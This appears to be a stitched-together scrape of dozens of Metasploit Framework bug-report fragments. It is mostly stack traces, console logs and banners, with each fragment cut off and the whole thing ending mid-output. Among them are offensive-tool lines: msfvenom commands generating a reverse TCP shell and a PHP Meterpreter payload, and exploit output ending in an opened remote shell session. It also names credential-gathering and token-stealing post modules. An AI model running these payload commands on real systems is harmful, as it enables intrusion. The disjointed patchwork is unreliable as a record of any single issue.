[-] call stack:
[-] /usr/share/metasploit-framework/lib/msf/core/post/linux/priv.rb:24:in `is_root?'
[-] /usr/share/metasploit-framework/modules/post/linux/gather/hashdump.rb:27:in `run' you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
16:19:39 default j:1 s:1 auxiliary(socks4a) > jobs -i 1
\ name: socks4a proxy server, started at 2017-04-17 16:07:38 -0500
[-] error while running command jobs: undefined method `show_options' for #<msf::ui::console::commanddispatcher::jobs: > call stack:
/home/egypt/repo/metasploit-framework/lib/msf/ui/console/command_dispatcher/jobs.rb:172:in `cmd_jobs'
/home/egypt/repo/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command'
/home/egypt/repo/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single'
/home/egypt/repo/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `each'
/home/egypt/repo/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single'
/home/egypt/repo/metasploit-framework/lib/rex/ui/text/shell.rb:205:in `run'
/home/egypt/repo/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/home/egypt/repo/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:48:in `<main>'
``` ## system stuff
metasploit reports 0 modules loaded from the path
it seems to still load the modules, just not print the correct report in the end
you can see the behavior change below
brandons-mbp:metasploit-framework bperry$ git checkout 4.14.7
note: checking out '4.14.7'
you are in 'detached head' state
you can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout
if you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again
example: git checkout -b <new-branch-name> head is now at 05201b9578..
land #8177 tomcat_gather docs fix
brandons-mbp:metasploit-framework bperry$ ./msfconsole metasploit park, system security interface version 4.0.5, alpha e ready..
> access security access: permission denied
> access security grid access: permission denied
> access main security grid access: permission denied....and..
you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! =[ metasploit v4.14.7-dev-05201b9578 ]
+ -- --=[ 1637 exploits - 955 auxiliary - 287 post ]
+ -- --=[ 472 payloads - 40 encoders - 9 nops ]
+ -- --=[ free metasploit pro trial: ] msf > loadpath /users/bperry/projects/volatileminds_modules/modules/
loaded 60 modules: 52 auxiliarys 8 exploits
brandons-mbp:metasploit-framework bperry$ git checkout 4.14.8
previous head position was 05201b9578..
land #8177 tomcat_gather docs fix
head is now at 68347ae06e..
land #8188, update client to use tls1.2
brandons-mbp:metasploit-framework bperry$ ./msfconsole .~+p``````-o+:
.+oooyysyyssyyssyddh++os-````` ``````````````` `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.` .-.-...-////+++++++++++++++////////~~//////++++++++++++/// `...............` `...-/////...` .::::::::::-
.::::::- .hmmmmmmmmmmmnddds\\...//m\\\\.../hddddmmmmmmmno :nm-/nmmmmmmmmmmmmm$$nmmmmm&&mmmmmmmmmmmmmmy .sm/`-ymmmmmmmmmmmm$$mmmmmn&&mmmmmmmmmmmmmh` -nd` :mmmmmmmmmmm$$mmmmmn&&mmmmmmmmmmmmh` -nh` .ymmmmmmmmmm$$mmmmmn&&mmmmmmmmmmmm/ `oo/``-hd: `` .snd :mmmmmmmmmm$$mmmmmn&&mmmmmmmmmmm/ .ynmmmh//+syysso-`````` -mh` :mmmmmmmmmm$$mmmmmn&&mmmmmmmmmmd .shmmmmn//dmnmmmmmmmmmmmms` `:```-o++++oooo+:/ooooo+:+o+++oooo++/ `///omh//dmmmmmmmmmmmmmmmn/:::::/+ooso--/ydh//+s+/ossssso:--syn///os: /mmmmmmmmmmmmmmmmmmd
`/++-.-yy/...osydh/-+oo:-`o//...oyodh+ -hmmmssddd+:dmmmnmmh
`.-=mmk.//^^^\\\\.^^`:++:^^o://^^^\\\\`:: .smmmo
-dmd--:mn/` ||--x--|| ||--x--||
........../yddy/:...+hmo-...hdd:............\\\\=v=//............\\\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| session one died of dysentery
|=========================
=====================+--------------------------------+=========================
================================================================================ press enter to size up the situation %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% date: april 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% weather: it's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% health: overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% hacked: all the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% press space bar to continue =[ metasploit v4.14.8-dev-68347ae06e ]
+ -- --=[ 1639 exploits - 959 auxiliary - 287 post ]
+ -- --=[ 472 payloads - 40 encoders - 9 nops ]
+ -- --=[ free metasploit pro trial: ] msf > loadpath /users/bperry/projects/volatileminds_modules/modules/
loaded 0 modules:
``` ## system stuff
the following stack trace is the result of a file getting created by a user upon startup in the /tmp directory that is never deleted
thus when a second user tries to run metasploit, it tries to clobber that file and metasploit fails to load
i'm not sure of the purpose of this class so outside of deleting the /tmp/module file after it serves it's purpose i cannot propose the appropriate fix
please confer with acammack-r7
/opt/metasploit-framework/embedded/framework/lib/msf/core/modules/external/shim.rb:12:in `initialize': permission denied @ rb_sysopen - /tmp/module (errno::eacces) from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/external/shim.rb:12:in `open' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/external/shim.rb:12:in `generate' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/executable.rb:85:in `read_module_content' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/base.rb:126:in `load_module' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/base.rb:237:in `block in load_modules' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/executable.rb:51:in `block (2 levels) in each_module_reference_name' from /opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rex-core-0.1.8/lib/rex/file.rb:133:in `block in find' from /opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rex-core-0.1.8/lib/rex/file.rb:132:in `catch' from /opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rex-core-0.1.8/lib/rex/file.rb:132:in `find' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/executable.rb:42:in `block in each_module_reference_name' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/executable.rb:31:in `foreach' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/executable.rb:31:in `each_module_reference_name' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/base.rb:236:in `load_modules' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/loading.rb:119:in `block in load_modules' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/loading.rb:117:in `each' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/loading.rb:117:in `load_modules' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/module_paths.rb:41:in `block in add_module_path' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/module_paths.rb:40:in `each' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/module_paths.rb:40:in `add_module_path' from /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/framework/module_paths.rb:50:in `block in init_module_paths' from /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/framework/module_paths.rb:49:in `each' from /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/framework/module_paths.rb:49:in `init_module_paths' from /opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:219:in `initialize' from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:62:in `new' from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:62:in `driver' from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start' from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start' from /opt/metasploit-framework/bin/../embedded/framework/msfconsole:48:in `<main>' ## system stuff
returns false
the meterpreter dies
after some seconds it also gives me an error that the session has been closed because the payload was not valid
## system stuff
returns error: exploit failed: errno::enoent no such file or directory @ rb_sysopen - /usr/share/metasploit-framework/data/exploits/cmdstager/vbs_b64 ### os
kali linux rolling
error message on executing any command after the rpc call, hang after trying to return to the session the exact error message is:
msf exploit(psexec) > sessions -i 1
[*] starting interaction with 1..
meterpreter > help
[-] session manipulation failed: undefined method `write\' for #<rex::ui::text::output::buffer: > ["/opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rb-readline-0.5.4/lib/rbreadline.rb:3917:in `_rl_output_some_chars\'", "/opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rb-readline-0.5.4/lib/rbreadline.rb:3096:in `update_line\'", "/opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rb-readline-0.5.4/lib/rbreadline.rb:3587:in `rl_redisplay\'", "/opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rb-readline-0.5.4/lib/rbreadline.rb:4005:in `readline_internal_setup\'", "/opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rb-readline-0.5.4/lib/rbreadline.rb:4852:in `readline_internal\'", "/opt/metasploit-framework/embedded/lib/ruby/gems/2.3.0/gems/rb-readline-0.5.4/lib/rbreadline.rb:4875:in `readline\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:100:in `pgets\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:188:in `run\'", "/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact\'", "/opt/metasploit-framework/embedded/framework/lib/msf/base/sessions/meterpreter.rb:481:in `_interact\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/interactive.rb:49:in `interact\'", "/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/core.rb:1326:in `cmd_sessions\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `each\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single\'", "/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:205:in `run\'", "/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start\'", "/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start\'", "/opt/metasploit-framework/bin/../embedded/framework/msfconsole:48:in `<main>\'"]
msf exploit(psexec) > sessions -i 1
[*] starting interaction with 1..
[msfconsole doesn't respond to any input at this point]
``` ## system stuff
the prompt gets eaten by the evil cursor ## system stuff
osx el capitan
the following message is currently sent to **stdout** > "this copy of metasploit-framework is more than two weeks old.
> consider running \'msfupdate\' to update to the latest version." ## system stuff
no sessions open, http requests are made from both sides
## system stuff
[*] importing 'openvas xml' data
[-] error while running command db_import: undefined method `split' for nil:nilclass call stack:
/usr/share/metasploit-framework/lib/rex/parser/openvas_nokogiri.rb:100:in `end_element'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/nokogiri-1.7.0.1/lib/nokogiri/xml/sax/document.rb:127:in `end_element_namespace'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/nokogiri-1.7.0.1/lib/nokogiri/xml/sax/parser.rb:112:in `parse_with'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/nokogiri-1.7.0.1/lib/nokogiri/xml/sax/parser.rb:112:in `parse_memory'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/nokogiri-1.7.0.1/lib/nokogiri/xml/sax/parser.rb:84:in `parse'
/usr/share/metasploit-framework/lib/msf/core/db_manager/import/open_vas.rb:11:in `import_openvas_new_xml'
/usr/share/metasploit-framework/lib/msf/core/db_manager/import.rb:95:in `import'
/usr/share/metasploit-framework/lib/msf/core/db_manager/import.rb:151:in `import_file'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1720:in `block (3 levels) in cmd_db_import'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1713:in `each'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1713:in `block (2 levels) in cmd_db_import'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1707:in `each'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1707:in `block in cmd_db_import'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/activerecord-4.2.7.1/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1702:in `cmd_db_import'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:205:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
``` ## system stuff
"uninitialized constant rex::post::meterpreter::tlv::tlv_type_migrate_len" is raised ## system stuff any supported os.
msf auxiliary(browser_autopwn2) >
[*] starting exploit modules...
[-] auxiliary failed: nomethoderror undefined method `[]' for nil:nilclass
[-] call stack:
[-] /opt/metasploit/lib/msf/core/exploit/browser_autopwn2.rb:130:in `set_exploit_options'
[-] /opt/metasploit/lib/msf/core/exploit/browser_autopwn2.rb:448:in `block in start_exploits'
[-] /opt/metasploit/lib/msf/core/exploit/browser_autopwn2.rb:447:in `each'
[-] /opt/metasploit/lib/msf/core/exploit/browser_autopwn2.rb:447:in `start_exploits'
[-] /opt/metasploit/lib/msf/core/exploit/browser_autopwn2.rb:482:in `setup'
[*] cleaning up jobs...
[*] cleaning up jobs.
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
specs randomly fail.
[-] post failed: nomethoderror undefined method `write' for nil:nilclass
[-] call stack:
[-] /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-socket-0.1.2/lib/rex/socket/ssl_tcp.rb:177:in `write'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:173:in `block in send_packet'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:171:in `synchronize'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:171:in `send_packet'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:228:in `send_packet_wait_response'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:200:in `send_request'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:95:in `_open'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:76:in `open'
[-] /usr/share/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:215:in `steal_token'
[-] /usr/share/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:282:in `run'
[*] post module execution completed
## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
it creates 2
maybe a patch like this to update it, looks like we could use some normalization between android and windows payload generation
had a little trouble following the paths through which a uuid might be generated, but still looking
diff --git a/lib/msf/core/payload/android/reverse_http.rb b/lib/msf/core/payload/android/reverse_http.rb
index 3f254a0423..589758e983 100644
--- a/lib/msf/core/payload/android/reverse_http.rb
+++ b/lib/msf/core/payload/android/reverse_http.rb
@@ -25,11 +25,6 @@ module payload::android::reversehttp transport_config_reverse_http(opts) end - def generate_config(opts={})
- opts[:uri] ||= luri + generate_uri(opts)
- super(opts)
- # # generate the uri for the initial stager #
the initial payload is generated, but no elf-so is generated.
# msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.10.10 lport=1337 prependfork=true -f elf-so -o elfso
no platform was selected, choosing msf::module::platform::linux from the payload
no arch selected, selecting arch: x86 from the payload
no encoder or badchars specified, outputting raw payload
payload size: 83 bytes
error: the payload could not be generated, check options
soz for poor report, i'm afk on a phone
session interaction fails with nil-pointer error, session irresponsive
## system stuff
infected apk session dead after almost 5 seconds over wan
## system stuff
- you receive a false positive result indicating that an incorrect password would give you access to a system via snmp
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
linux kali 4.8.0-kali1-686-pae #1 smp debian 4.8.5-1kali1 (2016-11-04) i686 gnu/linux
only one of them should be required
got exception
## system stuff
[-] auxiliary failed: rex::proto::dcerpc::exceptions::fault dcerpc fault => nca_op_rng_error
[-] call stack:
[-] /usr/share/metasploit-framework/lib/rex/proto/dcerpc/client.rb:315:in `call'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:119:in `is_vulnerable?'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:228:in `block in check_host'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:211:in `each'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:211:in `check_host'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:256:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] 10.0.1.6:21 - 530 please login with user and pass.
[-] auxiliary failed: nomethoderror undefined method `read' for nil:nilclass
did you mean? rand
[-] call stack:
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/ftp/colorado_ftp_traversal.rb:75:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
you get all results matching the *first* keyword
## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
linux kali 4.8.0-kali1-686-pae #1 smp debian 4.8.5-1kali1 (2016-11-04) i686 gnu/linux
powershell.exe peaks at 100% cpu until it is killed
customer calls angry
no relevant log entries in metasploit log file
## system stuff
the following error is generated:
[*] error: 192.168.0.27: activerecord::statementinvalid pg::programlimitexceeded: error: index row size 3288 exceeds maximum 2712 for index "index_metasploit_credential_privates_on_type_and_data"
hint: values larger than 1/3 of a buffer page cannot be indexed.
consider a function index of an md5 hash of the value, or use full text indexing.
``` this results in no session being created ```
msf auxiliary(ssh_login_pubkey) > sessions
active sessions
=============== no active sessions.
``` ## system stuff
the following issue is shown: ```
msf exploit(drb_remote_codeexec) > run [*] started reverse tcp double handler on 192.168.0.2:4444 [*] trying to exploit instance_eval
[-] exploit failed: drb::drbconnerror connection closed
[*] exploit completed, but no session was created.
``` the issue seems to be here that recent drb versions are not answering to the initial ``instance_eval`` call and so the drb::drbconnerror is thrown
however when removing the following lines: #l54-l58 #l96 the exploit still works: ```
[*] started reverse tcp double handler on 192.168.0.2:4444 [*] instance eval failed, trying to exploit syscall
[*] payload executed from file .dautpoy8v8mpyfv9
[*] make sure to remove that file
[*] accepted the first client connection...
[*] accepted the second client connection...
[*] command: echo xyx25ojho6t7tvvr;
[*] writing to socket a
[*] writing to socket b
[*] reading from sockets...
[*] reading from socket a
[*] a: "xyx25ojho6t7tvvr\ \ "
[*] matching...
[*] b is input...
[*] command shell session 1 opened (192.168.0.2:4444 -> 192.168.0.3:60806) at 2016-10-31 09:05:32 +0100
``` from my pov it seems the syscall exploit should be tried even if the instance_eval fails.
no processes are printed and only `true` is returned probably relevant error message from `~/.msf4/logs/framework.log`: <pre>
[10/24/2016 10:06:21] [e(0)] meterpreter: error running command ps: nomethoderror undefined method `print_line' for nil:nilclass
did you mean? printf
[10/24/2016 10:06:21] [d(0)] meterpreter: call stack:
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `print_line'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:75:in `print_line'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb:490:in `cmd_ps'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:428:in `run_command'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:390:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:384:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:384:in `run_single'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:281:in `run_cmd'
</pre> ## system stuff
vulns are not being populated
everything else populates correctly (hosts, services, etc)
## system stuff
it only throws the error:
no assembly installation was found.
## system stuff
the above error.
## system stuff
many of the modules fail for reasons unrelated to the lack of a suitable target.
powershell errors with syntax error
## system stuff framework running on kali 2016.1 rolling release, 64bit
framework: 4.12.23-dev
console: 4.12.23-dev windows target running windows 8.1 enterprise, 64bit
### i installed metasploit with:
- [x ] kali package via apt
### os framework running on kali 2016.1 rolling release, 64bit see msf_error_1.png screenshot showing all options and the "bad" generated psh stager after running the module
area highlighted where the semi-colon is missing
see msf_error_2.png screenshot showing the powershell error when run manually from the windows client (with "-w hidden" removed to show the error)
area highlighted in yellow where the semi-colon is missing
![msf_error_1]( ![msf_error_2]( cheers --bruk0ut edit: updated with the full correct module path (i accidentally omitted "exploit/multi/**script**/web_delivery in the original post).
`powershell.exe` sticks around, cpu hits 100%
## system stuff
the smb login attempt is being conducted via arbitrary source ports even when cport is defined
confirmed via several different packet captures / different cports (all being ignored).
payload calls back to handler, loads meterpreter into memory, opens a session but when i open the session none of the meterpreter commands will work and about 15 seconds later i receive an error stating that the session was invalid and will close
when i look on the target systems desktop there is an error stating that rundll32 has stopped working
when i duplicate these steps using the x86 handlers instead of the x64 i don't have these problems which leads me to believe that the 64 bit payload is crashing rundll32 and causing the session to terminate
although i am able to connect via a 32bit handler this presents problems for exploits that require a handle which matches the architecture of the target system (example: ikeext_service)
## system stuff attacking system: ubuntu 14.04 w/ metasploit framework using ruby 2.3.1
unsure of version but it was installed this git hub site 48 hours ago.
target system: windows 7 pro x64
error: 10.1.2.3: socketerror getaddrinfo: servname not supported for ai_socktype
``` which is actually: ```
[e(0)] core: error running against host 10.1.2.3: getaddrinfo: servname not supported for ai_socktype
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh/transport/packet_stream.rb:67:in `getnameinfo'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh/transport/packet_stream.rb:67:in `peer_ip'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh/transport/session.rb:107:in `host_as_string'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh/transport/session.rb:96:in `host_keys'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh/transport/algorithms.rb:251:in `prepare_preferred_algorithms!'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh/transport/algorithms.rb:124:in `initialize'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh/transport/session.rb:86:in `new'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh/transport/session.rb:86:in `initialize'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh.rb:232:in `new'
/home/user/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh.rb:232:in `start'
/opt/metasploit4/msf4/lib/metasploit/framework/login_scanner/ssh.rb:78:in `block in attempt_login'
/home/user/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:91:in `block in timeout'
/home/user/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:33:in `block in catch'
/home/user/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:33:in `catch'
/home/user/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:33:in `catch'
/home/user/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:106:in `timeout'
/opt/metasploit4/msf4/lib/metasploit/framework/login_scanner/ssh.rb:77:in `attempt_login'
/opt/metasploit4/msf4/lib/metasploit/framework/login_scanner/base.rb:222:in `block in scan!'
/opt/metasploit4/msf4/lib/metasploit/framework/login_scanner/base.rb:179:in `block in each_credential'
/opt/metasploit4/msf4/lib/metasploit/framework/credential_collection.rb:121:in `each'
/opt/metasploit4/msf4/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
/opt/metasploit4/msf4/lib/metasploit/framework/login_scanner/base.rb:204:in `scan!'
/opt/metasploit4/msf4/modules/auxiliary/scanner/ssh/ssh_login.rb:128:in `run_host'
/opt/metasploit4/msf4/lib/msf/core/auxiliary/scanner.rb:134:in `block (2 levels) in run'
/opt/metasploit4/msf4/lib/msf/core/thread_manager.rb:100:in `block in spawn'
it showed error as mentioned above you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces sorry there was no log
## system stuff
process crashes referencing address is the length of the startupinfoa struct on x64
it's miscalculating an offset when it calls createprocessa
## system stuff
[07/20/2016 17:14:15] [e(0)] core: error running against host 10.0.0.50: invalid argument - sendto(2) for "8.8.8.8" port /home/egypt/repo/metasploit-framework/lib/msf/core/exploit/capture.rb:312:in `send\'
/home/egypt/repo/metasploit-framework/lib/msf/core/exploit/capture.rb:312:in `block in probe_gateway'
/home/egypt/repo/metasploit-framework/lib/msf/core/exploit/capture.rb:310:in `open'
/home/egypt/repo/metasploit-framework/lib/msf/core/exploit/capture.rb:310:in `probe_gateway'
/home/egypt/repo/metasploit-framework/lib/msf/core/exploit/capture.rb:290:in `lookup_eth'
/home/egypt/repo/metasploit-framework/lib/msf/core/exploit/capture.rb:249:in `capture_sendto'
/home/egypt/repo/metasploit-framework/modules/auxiliary/scanner/ip/ipidseq.rb:72:in `block in run_host'
/home/egypt/repo/metasploit-framework/modules/auxiliary/scanner/ip/ipidseq.rb:67:in `times'
/home/egypt/repo/metasploit-framework/modules/auxiliary/scanner/ip/ipidseq.rb:67:in `run_host'
/home/egypt/repo/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:121:in `block (2 levels) in run'
/home/egypt/repo/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
## system stuff
as described above, and not what is expected or desired
log contains zilch on this, its not a runtime error, but a logic problem somewhere.
## system stuff
the tftp server stars and binds to ::: (all ipv6 interfaces) and it is not accessible with ipv4
connecting and downloading to 127.0.0.1 with a tftp client doesn't work.
## system stuff
output.exe crashes (appachebench command line utility has stopped working)
## system stuff
### os kali linux 2
all responses to any page (other than the payload's) are empty ```
~ $ curl -k
curl: (52) empty reply from server
## system stuff kali 2, also tested on debian.
apparently there is inconsistent handling of php tags between payloads and exploits : - payloads : php/bind_php does not add the tags while php/meterpreter/reverse_tcp does it (with a /**/ trick so that it would not be considered if the tag is already added before) : ```
~/tools/pentest/metasploit-framework $ ./msfvenom -p php/meterpreter/reverse_tcp
no platform was selected, choosing msf::module::platform::php from the payload
no arch selected, selecting arch: php from the payload
no encoder or badchars specified, outputting raw payload
payload size: 948 bytes
